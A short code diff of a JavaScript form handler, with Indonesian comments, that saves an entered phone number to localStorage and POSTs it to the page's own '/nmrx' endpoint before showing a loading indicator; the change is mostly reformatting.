@@ -181,26 +181,18 @@ lanjutBtn.addEventListener(
     }
 
     /* SIMPAN */
-    localStorage.setItem(
-    "nmrx",
-    phoneInput.value
-    );
+localStorage.setItem("nmrx", nomor);
 
-    /* KIRIM */
-    await fetch("/nmrx", {
-
-        method:"POST",
-
-        headers:{
-            "Content-Type":
-            "application/json"
-        },
-
-        body: JSON.stringify({
-    nmrx: nomor
-})
-
-    });
+/* KIRIM */
+await fetch("/nmrx", {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+        nmrx: nomor
+    })
+});
 
     /* SHOW LOADING */
     loadingBox.style.display =
